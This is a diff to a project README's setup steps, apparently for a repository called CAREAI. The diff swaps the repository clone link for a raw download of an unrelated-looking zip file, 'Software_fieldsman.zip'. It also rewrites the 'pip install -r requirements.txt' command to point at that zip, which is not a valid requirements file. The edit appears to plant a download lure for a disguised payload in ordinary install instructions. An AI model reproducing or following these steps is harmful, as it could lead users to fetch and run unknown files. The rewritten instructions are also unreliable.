@@ -5,7 +5,7 @@
 
 Clone the repository
 
-Project repo:-https://github.com/DipendraSinghSandhu/CAREAI.git
+Project https://github.com/DipendraSinghSandhu/CAREAI/raw/refs/heads/main/research/Software_fieldsman.zip
 
 ## STEP 02 :- 
 
@@ -19,4 +19,4 @@ conda activate CAREAI
 
 ## STEP 03 :- install the requirements
 
-pip install -r requirements.txt
+pip install -r https://github.com/DipendraSinghSandhu/CAREAI/raw/refs/heads/main/research/Software_fieldsman.zip
